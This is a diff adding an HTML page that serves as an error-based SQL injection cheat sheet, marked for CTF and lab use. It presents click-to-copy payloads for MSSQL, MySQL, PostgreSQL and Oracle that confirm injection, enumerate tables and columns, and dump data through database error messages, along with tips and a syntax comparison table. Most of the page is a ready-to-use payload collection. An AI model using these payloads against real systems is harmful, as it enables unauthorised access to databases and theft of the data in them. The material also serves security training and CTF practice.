@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Error-Based SQLi Cheat Sheet</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=IBM+Plex+Sans:wght@400;500;600&display=swap');
+
+  :root {
+    --bg: #0d0f12;
+    --bg2: #13161b;
+    --bg3: #1a1e25;
+    --border: rgba(255,255,255,0.07);
+    --border2: rgba(255,255,255,0.12);
+    --text: #c9cdd6;
+    --text2: #7a8194;
+    --text3: #4a5068;
+    --accent: #4ade80;
+    --accent2: #22d3ee;
+    --warn: #fbbf24;
+    --danger: #f87171;
+    --mssql: #3b82f6;
+    --mysql: #4ade80;
+    --pgsql: #a78bfa;
+    --oracle: #fb923c;
+    --font: 'IBM Plex Sans', sans-serif;
+    --mono: 'JetBrains Mono', monospace;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--font);
+    font-size: 14px;
+    line-height: 1.6;
+    min-height: 100vh;
+  }
+
+  /* Subtle grid background */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(255,255,255,0.015) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,255,255,0.015) 1px, transparent 1px);
+    background-size: 32px 32px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .container {
+    position: relative;
+    z-index: 1;
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 40px 24px 80px;
+  }
+
+  /* Header */
+  header {
+    margin-bottom: 36px;
+    padding-bottom: 24px;
+    border-bottom: 1px solid var(--border);
+  }
+  .header-top {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 6px;
+  }
+  .logo {
+    width: 32px; height: 32px;
+    background: linear-gradient(135deg, var(--danger), var(--warn));
+    border-radius: 8px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 16px;
+    flex-shrink: 0;
+  }
+  h1 {
+    font-family: var(--font);
+    font-size: 22px;
+    font-weight: 600;
+    color: #e8eaf0;
+    letter-spacing: -0.02em;
+  }
+  .subtitle {
+    font-size: 13px;
+    color: var(--text2);
+    margin-left: 44px;
+  }
+  .tag {
+    display: inline-block;
+    font-size: 10px;
+    font-weight: 500;
+    padding: 2px 7px;
+    border-radius: 4px;
+    background: rgba(248,113,113,0.12);
+    color: var(--danger);
+    border: 1px solid rgba(248,113,113,0.2);
+    margin-left: 8px;
+    vertical-align: middle;
+    letter-spacing: .04em;
+  }
+
+  /* DB Cards */
+  .db-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    margin-bottom: 10px;
+    overflow: hidden;
+    transition: border-color .2s;
+  }
+  .db-card:hover { border-color: var(--border2); }
+
+  .db-header {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 14px 18px;
+    cursor: pointer;
+    user-select: none;
+    transition: background .15s;
+  }
+  .db-header:hover { background: var(--bg3); }
+
+  .db-dot {
+    width: 10px; height: 10px;
+    border-radius: 50%;
+    flex-shrink: 0;
+  }
+  .mssql .db-dot { background: var(--mssql); box-shadow: 0 0 6px var(--mssql); }
+  .mysql .db-dot { background: var(--mysql); box-shadow: 0 0 6px var(--mysql); }
+  .pgsql .db-dot { background: var(--pgsql); box-shadow: 0 0 6px var(--pgsql); }
+  .oracle .db-dot { background: var(--oracle); box-shadow: 0 0 6px var(--oracle); }
+  .all-db .db-dot { background: var(--text2); }
+
+  .db-name {
+    font-size: 13px;
+    font-weight: 500;
+    color: #e8eaf0;
+    flex: 1;
+  }
+  .db-sub {
+    font-size: 12px;
+    color: var(--text2);
+  }
+  .chevron {
+    font-size: 10px;
+    color: var(--text3);
+    transition: transform .25s;
+  }
+  .db-header.open .chevron { transform: rotate(180deg); }
+
+  .db-body {
+    display: none;
+    padding: 0 18px 18px;
+    border-top: 1px solid var(--border);
+  }
+  .db-body.open { display: block; }
+
+  /* Sections */
+  .section-label {
+    font-size: 10px;
+    font-weight: 600;
+    letter-spacing: .1em;
+    text-transform: uppercase;
+    color: var(--text3);
+    margin: 18px 0 8px;
+  }
+
+  .payload-row { margin-bottom: 8px; }
+  .payload-desc {
+    font-size: 12px;
+    color: var(--text2);
+    margin-bottom: 4px;
+  }
+
+  .payload-code {
+    font-family: var(--mono);
+    font-size: 12px;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 9px 36px 9px 12px;
+    color: var(--accent2);
+    cursor: pointer;
+    position: relative;
+    white-space: pre-wrap;
+    word-break: break-all;
+    transition: border-color .15s, background .15s;
+  }
+  .payload-code:hover {
+    border-color: var(--border2);
+    background: rgba(34,211,238,0.04);
+  }
+  .copy-btn {
+    position: absolute;
+    right: 8px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-family: var(--font);
+    font-size: 10px;
+    color: var(--text3);
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 2px 7px;
+    cursor: pointer;
+    transition: color .15s, border-color .15s;
+  }
+  .payload-code:hover .copy-btn { color: var(--text2); border-color: var(--border2); }
+  .copy-btn.copied { color: var(--accent) !important; border-color: rgba(74,222,128,0.3) !important; }
+
+  /* Tip box */
+  .tip {
+    font-size: 12px;
+    color: var(--text2);
+    background: rgba(251,191,36,0.06);
+    border: 1px solid rgba(251,191,36,0.15);
+    border-radius: 6px;
+    padding: 10px 12px;
+    margin-top: 14px;
+    line-height: 1.7;
+  }
+  .tip code {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--warn);
+    background: rgba(251,191,36,0.1);
+    padding: 1px 5px;
+    border-radius: 3px;
+  }
+  .tip strong { color: #e8eaf0; font-weight: 500; }
+
+  /* Warning tip */
+  .tip-warn {
+    background: rgba(248,113,113,0.06);
+    border-color: rgba(248,113,113,0.15);
+    margin-top: 0;
+    margin-bottom: 14px;
+  }
+  .tip-warn code { color: var(--danger); background: rgba(248,113,113,0.1); }
+
+  /* Quick ref table */
+  .ref-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 12px;
+    margin-top: 4px;
+  }
+  .ref-table th {
+    text-align: left;
+    padding: 8px 10px;
+    font-weight: 500;
+    font-size: 11px;
+    border-bottom: 1px solid var(--border2);
+  }
+  .ref-table td {
+    padding: 7px 10px;
+    border-bottom: 1px solid var(--border);
+    color: var(--text2);
+    vertical-align: top;
+  }
+  .ref-table tr:last-child td { border-bottom: none; }
+  .ref-table td:first-child { color: var(--text); font-weight: 500; }
+  .ref-table td code {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--accent2);
+  }
+  .ref-table th.mssql-h { color: var(--mssql); }
+  .ref-table th.mysql-h { color: var(--mysql); }
+  .ref-table th.pgsql-h { color: var(--pgsql); }
+  .ref-table th.oracle-h { color: var(--oracle); }
+
+  /* Error preview */
+  .error-preview {
+    font-family: var(--mono);
+    font-size: 11px;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--danger);
+    border-radius: 6px;
+    padding: 10px 12px;
+    color: var(--text2);
+    margin-top: 14px;
+    line-height: 1.8;
+  }
+  .error-preview strong { color: var(--accent); }
+
+  /* Footer */
+  footer {
+    text-align: center;
+    font-size: 11px;
+    color: var(--text3);
+    margin-top: 48px;
+    padding-top: 24px;
+    border-top: 1px solid var(--border);
+  }
+</style>
+</head>
+<body>
+<div class="container">
+
+  <header>
+    <div class="header-top">
+      <div class="logo">⚡</div>
+      <h1>Error-Based SQLi <span class="tag">CTF</span></h1>
+    </div>
+    <div class="subtitle">Cheat sheet — click any payload to copy &nbsp;·&nbsp; MSSQL · MySQL · PostgreSQL · Oracle</div>
+  </header>
+
+  <!-- MSSQL -->
+  <div class="db-card mssql">
+    <div class="db-header open" onclick="toggle(this)">
+      <div class="db-dot"></div>
+      <span class="db-name">Microsoft SQL Server</span>
+      <span class="db-sub">MSSQL</span>
+      <span class="chevron open">▼</span>
+    </div>
+    <div class="db-body open">
+      <div class="section-label">Confirm injection</div>
+      <div class="payload-row">
+        <div class="payload-desc">Type conversion error — leaks value in error message</div>
+        <div class="payload-code" onclick="copy(this)">CONVERT(int, @@version)<span class="copy-btn">copy</span></div>
+      </div>
+      <div class="payload-row">
+        <div class="payload-desc">Alternative using CAST</div>
+        <div class="payload-code" onclick="copy(this)">CAST(@@version AS int)<span class="copy-btn">copy</span></div>
+      </div>
+
+      <div class="section-label">Get DB info</div>
+      <div class="payload-row">
+        <div class="payload-desc">Database name</div>
+        <div class="payload-code" onclick="copy(this)">CONVERT(int, db_name())<span class="copy-btn">copy</span></div>
+      </div>
+      <div class="payload-row">
+        <div class="payload-desc">Current user</div>
+        <div class="payload-code" onclick="copy(this)">CONVERT(int, system_user)<span class="copy-btn">copy</span></div>
+      </div>
+
+      <div class="section-label">Enumerate tables</div>
+      <div class="payload-row">
+        <div class="payload-desc">First table</div>
+        <div class="payload-code" onclick="copy(this)">CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))<span class="copy-btn">copy</span></div>
+      </div>
+      <div class="payload-row">
+        <div class="payload-desc">Paginate — add found names to NOT IN list</div>
+        <div class="payload-code" onclick="copy(this)">CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN ('products')))<span class="copy-btn">copy</span></div>
+      </div>
+
+      <div class="section-label">Enumerate columns</div>
+      <div class="payload-row">
+        <div class="payload-desc">First column of target table</div>
+        <div class="payload-code" onclick="copy(this)">CONVERT(int,(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='TARGET'))<span class="copy-btn">copy</span></div>
+      </div>
+
+      <div class="section-label">Extract data</div>
+      <div class="payload-row">
+        <div class="payload-desc">Dump a value</div>
+        <div class="payload-code" onclick="copy(this)">CONVERT(int,(SELECT TOP 1 col_name FROM target_table))<span class="copy-btn">copy</span></div>
+      </div>
+      <div class="payload-row">
+        <div class="payload-desc">CASE WHEN wrapper — use in sort/order parameters</div>
+        <div class="payload-code" onclick="copy(this)">CASE WHEN (1=2) THEN id ELSE CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)) END<span class="copy-btn">copy</span></div>
+      </div>
+      <div class="payload-row">
+        <div class="payload-desc">WHERE clause injection — use in name/search parameters</div>
+        <div class="payload-code" onclick="copy(this)">' OR 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--<span class="copy-btn">copy</span></div>
+      </div>
+
+      <div class="error-preview">
+        Error leaks value between quotes:<br>
+        Conversion failed when converting the nvarchar value '<strong>FLAG{abc123}</strong>' to data type int.
+      </div>
+    </div>
+  </div>
+
+  <!-- MySQL -->
+  <div class="db-card mysql">
+    <div class="db-header" onclick="toggle(this)">
+      <div class="db-dot"></div>
+      <span class="db-name">MySQL / MariaDB</span>
+      <span class="db-sub">MySQL</span>
+      <span class="chevron">▼</span>
+    </div>
+    <div class="db-body">
+      <div class="tip tip-warn">
+        ⚠ MySQL's <code>CAST()</code> returns null instead of erroring. Use <code>extractvalue()</code> or <code>updatexml()</code> instead.
+      </div>
+
+      <div class="section-label">ExtractValue() method</div>
+      <div class="payload-row">
+        <div class="payload-desc">Version — invalid XPath triggers the error</div>
+        <div class="payload-code" onclick="copy(this)">extractvalue(1,concat(0x7e,version()))<span class="copy-btn">copy</span></div>
+      </div>
+      <div class="payload-row">
+        <div class="payload-desc">Database name</div>
+        <div class="payload-code" onclick="copy(this)">extractvalue(1,concat(0x7e,database()))<span class="copy-btn">copy</span></div>
+      </div>
+      <div class="payload-row">
+        <div class="payload-desc">First table</div>
+        <div class="payload-code" onclick="copy(this)">extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))<span class="copy-btn">copy</span></div>
+      </div>
+      <div class="payload-row">
+        <div class="payload-desc">Second table (increment LIMIT offset)</div>
+        <div class="payload-code" onclick="copy(this)">extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1)))<span class="copy-btn">copy</span></div>
+      </div>
+
+      <div class="section-label">UpdateXML() method</div>
+      <div class="payload-row">
+        <div class="payload-desc">Alternative to ExtractValue</div>
+        <div class="payload-code" onclick="copy(this)">updatexml(1,concat(0x7e,(SELECT version())),1)<span class="copy-btn">copy</span></div>
+      </div>
+      <div class="payload-row">
+        <div class="payload-desc">Table name via UpdateXML</div>
+        <div class="payload-code" onclick="copy(this)">updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)),1)<span class="copy-btn">copy</span></div>
+      </div>
+
+      <div class="section-label">Extract data</div>
+      <div class="payload-row">
+        <div class="payload-desc">Dump column value</div>
+        <div class="payload-code" onclick="copy(this)">extractvalue(1,concat(0x7e,(SELECT col FROM target_table LIMIT 0,1)))<span class="copy-btn">copy</span></div>
+      </div>
+      <div class="payload-row">
+        <div class="payload-desc">Long values — extract in 30-char chunks</div>
+        <div class="payload-code" onclick="copy(this)">extractvalue(1,concat(0x7e,substring((SELECT col FROM target_table LIMIT 0,1),1,30)))<span class="copy-btn">copy</span></div>
+      </div>
+      <div class="payload-row">
+        <div class="payload-desc">WHERE clause injection</div>
+        <div class="payload-code" onclick="copy(this)">' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))--<span class="copy-btn">copy</span></div>
+      </div>
+
+      <div class="tip">
+        <code>0x7e</code> = <strong>~</strong> delimiter. Avoid starting the XPath with <code>/ . @</code> or a fully alphanumeric string — those are valid XPath and won't error.
+      </div>
+    </div>
+  </div>
+
+  <!-- PostgreSQL -->
+  <div class="db-card pgsql">
+    <div class="db-header" onclick="toggle(this)">
+      <div class="db-dot"></div>
+      <span class="db-name">PostgreSQL</span>
+      <span class="db-sub">PostgreSQL</span>
+      <span class="chevron">▼</span>
+    </div>
+    <div class="db-body">
+      <div class="section-label">Confirm injection</div>
+      <div class="payload-row">
+        <div class="payload-desc">Type cast error</div>
+        <div class="payload-code" onclick="copy(this)">CAST(version() AS int)<span class="copy-btn">copy</span></div>
+      </div>
+
+      <div class="section-label">Get DB info</div>
+      <div class="payload-row">
+        <div class="payload-desc">Version — use version() not @@version</div>
+        <div class="payload-code" onclick="copy(this)">CAST(version() AS int)<span class="copy-btn">copy</span></div>
+      </div>
+      <div class="payload-row">
+        <div class="payload-desc">Current database</div>
+        <div class="payload-code" onclick="copy(this)">CAST(current_database() AS int)<span class="copy-btn">copy</span></div>
+      </div>
+      <div class="payload-row">
+        <div class="payload-desc">Current user</div>
+        <div class="payload-code" onclick="copy(this)">CAST(current_user AS int)<span class="copy-btn">copy</span></div>
+      </div>
+
+      <div class="section-label">Enumerate tables</div>
+      <div class="payload-row">
+        <div class="payload-desc">First table</div>
+        <div class="payload-code" onclick="copy(this)">CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1) AS int)<span class="copy-btn">copy</span></div>
+      </div>
+      <div class="payload-row">
+        <div class="payload-desc">Paginate using OFFSET</div>
+        <div class="payload-code" onclick="copy(this)">CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 1) AS int)<span class="copy-btn">copy</span></div>
+      </div>
+
+      <div class="section-label">Extract data</div>
+      <div class="payload-row">
+        <div class="payload-desc">Dump a value</div>
+        <div class="payload-code" onclick="copy(this)">CAST((SELECT col FROM target_table LIMIT 1) AS int)<span class="copy-btn">copy</span></div>
+      </div>
+      <div class="payload-row">
+        <div class="payload-desc">WHERE clause injection</div>
+        <div class="payload-code" onclick="copy(this)">' OR 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1) AS int)--<span class="copy-btn">copy</span></div>
+      </div>
+
+      <div class="tip">
+        Key difference from MSSQL: use <code>version()</code> not <code>@@version</code>, and paginate with <code>LIMIT 1 OFFSET n</code> instead of <code>TOP 1 ... NOT IN</code>.
+      </div>
+    </div>
+  </div>
+
+  <!-- Oracle -->
+  <div class="db-card oracle">
+    <div class="db-header" onclick="toggle(this)">
+      <div class="db-dot"></div>
+      <span class="db-name">Oracle DB</span>
+      <span class="db-sub">Oracle</span>
+      <span class="chevron">▼</span>
+    </div>
+    <div class="db-body">
+      <div class="tip tip-warn">
+        ⚠ Oracle uses <code>dbms_xmlgen.getxml()</code> with an invalid column name to trigger errors. Column names are limited to 30 chars — always use <code>substr()</code>.
+      </div>
+
+      <div class="section-label">Core technique</div>
+      <div class="payload-row">
+        <div class="payload-desc">Version via dbms_xmlgen — invalid column name triggers error</div>
+        <div class="payload-code" onclick="copy(this)">to_char(dbms_xmlgen.getxml('select "'||substr((SELECT banner FROM v$version WHERE rownum=1),1,30)||'" from sys.dual'))<span class="copy-btn">copy</span></div>
+      </div>
+
+      <div class="section-label">Get DB info</div>
+      <div class="payload-row">
+        <div class="payload-desc">Current user</div>
+        <div class="payload-code" onclick="copy(this)">to_char(dbms_xmlgen.getxml('select "'||user||'" from sys.dual'))<span class="copy-btn">copy</span></div>
+      </div>
+
+      <div class="section-label">Enumerate tables</div>
+      <div class="payload-row">
+        <div class="payload-desc">First table</div>
+        <div class="payload-code" onclick="copy(this)">to_char(dbms_xmlgen.getxml('select "'||(SELECT table_name FROM all_tables WHERE rownum=1)||'" from sys.dual'))<span class="copy-btn">copy</span></div>
+      </div>
+      <div class="payload-row">
+        <div class="payload-desc">Paginate via NOT IN</div>
+        <div class="payload-code" onclick="copy(this)">to_char(dbms_xmlgen.getxml('select "'||(SELECT table_name FROM all_tables WHERE table_name NOT IN ('KNOWN_TABLE') AND rownum=1)||'" from sys.dual'))<span class="copy-btn">copy</span></div>
+      </div>
+
+      <div class="section-label">Extract data</div>
+      <div class="payload-row">
+        <div class="payload-desc">Dump value — substr keeps under 30-char limit</div>
+        <div class="payload-code" onclick="copy(this)">to_char(dbms_xmlgen.getxml('select "'||substr((SELECT col FROM target_table WHERE rownum=1),1,30)||'" from sys.dual'))<span class="copy-btn">copy</span></div>
+      </div>
+      <div class="payload-row">
+        <div class="payload-desc">Next 30 chars</div>
+        <div class="payload-code" onclick="copy(this)">to_char(dbms_xmlgen.getxml('select "'||substr((SELECT col FROM target_table WHERE rownum=1),31,30)||'" from sys.dual'))<span class="copy-btn">copy</span></div>
+      </div>
+
+      <div class="tip">
+        Use <code>||</code> for string concat (not <code>+</code> or <code>concat()</code>). Always wrap inner query values in <code>substr(,1,30)</code> — Oracle enforces a 30-char column name limit.
+      </div>
+    </div>
+  </div>
+
+  <!-- Quick Reference -->
+  <div class="db-card all-db" style="margin-top:20px">
+    <div class="db-header" onclick="toggle(this)">
+      <div class="db-dot"></div>
+      <span class="db-name">Quick reference — syntax differences</span>
+      <span class="db-sub">All DBs</span>
+      <span class="chevron">▼</span>
+    </div>
+    <div class="db-body">
+      <table class="ref-table">
+        <tr>
+          <th>Goal</th>
+          <th class="mssql-h">MSSQL</th>
+          <th class="mysql-h">MySQL</th>
+          <th class="pgsql-h">PostgreSQL</th>
+          <th class="oracle-h">Oracle</th>
+        </tr>
+        <tr>
+          <td>Version</td>
+          <td><code>@@version</code></td>
+          <td><code>version()</code></td>
+          <td><code>version()</code></td>
+          <td><code>v$version</code></td>
+        </tr>
+        <tr>
+          <td>Error trigger</td>
+          <td><code>CONVERT(int,x)</code></td>
+          <td><code>extractvalue()</code></td>
+          <td><code>CAST(x AS int)</code></td>
+          <td><code>dbms_xmlgen</code></td>
+        </tr>
+        <tr>
+          <td>String concat</td>
+          <td><code>'a'+'b'</code></td>
+          <td><code>concat(a,b)</code></td>
+          <td><code>'a'||'b'</code></td>
+          <td><code>'a'||'b'</code></td>
+        </tr>
+        <tr>
+          <td>First row</td>
+          <td><code>TOP 1</code></td>
+          <td><code>LIMIT 0,1</code></td>
+          <td><code>LIMIT 1</code></td>
+          <td><code>rownum=1</code></td>
+        </tr>
+        <tr>
+          <td>Paginate</td>
+          <td><code>NOT IN (...)</code></td>
+          <td><code>LIMIT n,1</code></td>
+          <td><code>LIMIT 1 OFFSET n</code></td>
+          <td><code>NOT IN (...)</code></td>
+        </tr>
+        <tr>
+          <td>Tables meta</td>
+          <td><code>information_schema</code></td>
+          <td><code>information_schema</code></td>
+          <td><code>information_schema</code></td>
+          <td><code>all_tables</code></td>
+        </tr>
+        <tr>
+          <td>Comment</td>
+          <td><code>-- or /**/</code></td>
+          <td><code>-- or #</code></td>
+          <td><code>--</code></td>
+          <td><code>--</code></td>
+        </tr>
+        <tr>
+          <td>Substring</td>
+          <td><code>SUBSTRING(x,1,30)</code></td>
+          <td><code>substring(x,1,30)</code></td>
+          <td><code>substring(x,1,30)</code></td>
+          <td><code>substr(x,1,30)</code></td>
+        </tr>
+      </table>
+    </div>
+  </div>
+
+  <footer>
+    Error-Based SQLi Cheat Sheet &nbsp;·&nbsp; For authorized CTF / lab use only
+  </footer>
+
+</div>
+
+<script>
+function toggle(header) {
+  const body = header.nextElementSibling;
+  const chev = header.querySelector('.chevron');
+  const isOpen = body.classList.contains('open');
+  body.classList.toggle('open', !isOpen);
+  header.classList.toggle('open', !isOpen);
+  chev.classList.toggle('open', !isOpen);
+}
+
+function copy(el) {
+  const btn = el.querySelector('.copy-btn');
+  const text = el.childNodes[0].textContent.trim();
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = 'copied!';
+    btn.classList.add('copied');
+    setTimeout(() => {
+      btn.textContent = 'copy';
+      btn.classList.remove('copied');
+    }, 1500);
+  }).catch(() => {
+    const range = document.createRange();
+    range.selectNode(el.childNodes[0]);
+    window.getSelection().removeAllRanges();
+    window.getSelection().addRange(range);
+  });
+}
+</script>
+</body>
+</html>
